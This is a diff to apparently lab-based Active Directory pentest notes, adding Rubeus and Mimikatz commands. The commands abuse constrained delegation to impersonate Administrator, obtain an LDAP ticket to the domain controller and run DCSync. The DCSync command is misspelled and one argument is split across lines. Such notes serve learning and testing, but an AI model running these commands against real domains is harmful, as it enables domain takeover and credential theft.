@@ -322,7 +322,7 @@ To impersonate the user, Service for user as known as `S4U` extension is used wh
 * **Service for User to Proxy (S4U2proxy)**: Allows a service to obtain a TGS to a second service on behalf of a user. The attribute `msDS-AllowedToDelegate` attribute contains a list of SPNs to which the user tokens can be forwarded.
 
 
-To abuse constrained delegation, we need to have access to the web service account. If we have access to that account, it is possible to access the services listed in `msDS-AllowedToDelegateTo` of the web service accoutn as any user.
+To abuse constrained delegation, we need to have access to the web service account. If we have access to that account, it is possible to access the services listed in `msDS-AllowedToDelegateTo` of the web service account as any user.
 
 * PowerView Dev:
 ```powershell
@@ -353,6 +353,22 @@ Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@corp.local@CORP.LOCAL
 ```
 
 > **Note**: The delegation occurs not only for the specified service but for any service running under the same account. The is no validation for the SPN specified.
+
+So we can ask for other service on a machine, in case of having Constrained delegation on the DC we can ask to the LDAP TGS in order to do a DCSync attack.
+
+* Rubeus
+```
+.\Rubeus.exe asktgt /user:DCORP-ADMINSRV$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96 /outfile:ADMINSRV-TGT.kirbi
+
+.\Rubeus.exe s4u /ticket:ADMINSRV-TGT.kirbi /impersonateuser:Administrator /outfile:Administrator-TGS
+
+.\Rubeus.exe s4u /ticket:ADMINSRV-TGT.kirbi /tgs:Administrator-TGS_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"TIME/dcorp-dc.dollarcorp.moneycorp.local" /altservice:LDAP /ou
+tfile:LDAP-Administrator
+
+.\Rubeus.exe ptt /ticket:LDAP-Administrator_LDAP-dcorp-dc.dollarcorp.moneycorp.local
+
+Invoke-Mimikatz -Command '"lsadump::dcsyinc /user:dcorp\Administrator"'
+```
 
 ## Mitigation
 
